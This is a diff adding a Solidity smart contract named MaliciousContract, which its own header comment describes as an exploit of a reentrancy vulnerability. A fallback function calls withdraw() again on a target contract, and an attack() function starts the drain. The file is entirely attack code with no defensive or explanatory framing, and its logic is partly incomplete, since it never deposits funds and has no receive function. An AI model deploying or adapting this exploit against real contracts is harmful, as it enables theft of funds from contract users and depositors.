@@ -1,0 +1,32 @@
+// Malicious contract to exploit the reentrancy vulnerability
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IWithdraw {
+    function withdraw(uint256 amount) external;
+}
+
+contract MaliciousContract {
+    IWithdraw public vulnerableContract;
+    
+    // Attacker's balance
+    uint256 public withdrawnAmount;
+
+    constructor(address _vulnerableContract) {
+        vulnerableContract = IWithdraw(_vulnerableContract);
+    }
+
+    // Fallback function to recursively call withdraw
+    fallback() external payable {
+        if (withdrawnAmount < 1 ether) { // Prevent infinite recursion
+            withdrawnAmount += 1 ether;
+            vulnerableContract.withdraw(1 ether);
+        }
+    }
+
+    // Start the attack
+    function attack() external payable {
+        require(msg.value == 1 ether, "Send 1 ether to attack");
+        vulnerableContract.withdraw(1 ether);
+    }
+}
